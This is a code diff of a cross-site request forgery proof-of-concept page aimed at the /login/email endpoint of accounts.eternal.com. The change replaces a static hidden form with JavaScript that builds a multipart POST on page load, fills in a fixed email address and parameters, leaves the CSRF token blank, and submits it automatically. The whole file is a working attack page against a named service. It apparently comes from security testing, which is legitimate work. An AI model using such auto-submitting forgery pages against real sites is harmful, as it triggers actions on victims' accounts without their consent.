@@ -2,28 +2,56 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>CSRF PoC - accounts.eternal.com /login/email</title>
+  <title>CSRF PoC (JS-built form) - accounts.eternal.com /login/email</title>
 </head>
 <body>
-  <h3>CSRF PoC: /login/email (type=initiate)</h3>
-  <p>This form auto-submits a cross-site request to the target endpoint using multipart/form-data, mirroring the captured request. Open this page while logged in / with an active session on the target to test whether the request is accepted without a valid CSRF token.</p>
+  <h3>CSRF PoC: /login/email (type=initiate) — built via JavaScript</h3>
+  <p>The form below is constructed dynamically in JavaScript rather than hard-coded in HTML, then submitted automatically.</p>
 
-  <form id="csrf-poc" action="https://accounts.eternal.com/login/email" method="POST" enctype="multipart/form-data">
-    <input type="hidden" name="email" value="bismillah54366@gmail.com">
-    <input type="hidden" name="csrf_token" value="">
-    <input type="hidden" name="lc" value="1eef4a5b8ae4427fa40bd23003baa7d1">
-    <input type="hidden" name="type" value="initiate">
-    <input type="hidden" name="otp" value="">
-    <input type="hidden" name="invite_id" value="">
-    <input type="hidden" name="theme" value="">
-    <input type="hidden" name="name" value="">
-    <input type="submit" value="Submit request (or auto-submits below)">
-  </form>
+  <div id="status">Building and submitting request...</div>
 
   <script>
-    // Auto-submit on page load for PoC purposes.
-    // Comment this out if you want to manually trigger submission instead.
-    document.getElementById('csrf-poc').submit();
+    (function () {
+      var targetUrl = "https://accounts.eternal.com/login/email";
+
+      var fields = {
+        email: "bismillah54366@gmail.com",
+        csrf_token: "",
+        lc: "1eef4a5b8ae4427fa40bd23003baa7d1",
+        type: "initiate",
+        otp: "",
+        invite_id: "",
+        theme: "",
+        name: ""
+      };
+
+      // Create the form element
+      var form = document.createElement("form");
+      form.id = "csrf-poc";
+      form.action = targetUrl;
+      form.method = "POST";
+      form.enctype = "multipart/form-data";
+
+      // Dynamically add each field as a hidden input
+      for (var key in fields) {
+        if (Object.prototype.hasOwnProperty.call(fields, key)) {
+          var input = document.createElement("input");
+          input.type = "hidden";
+          input.name = key;
+          input.value = fields[key];
+          form.appendChild(input);
+        }
+      }
+
+      // Attach to the page (required for submission in most browsers)
+      document.body.appendChild(form);
+
+      // Auto-submit the generated form
+      form.submit();
+
+      document.getElementById("status").textContent =
+        "Request submitted to " + targetUrl;
+    })();
   </script>
 </body>
 </html>
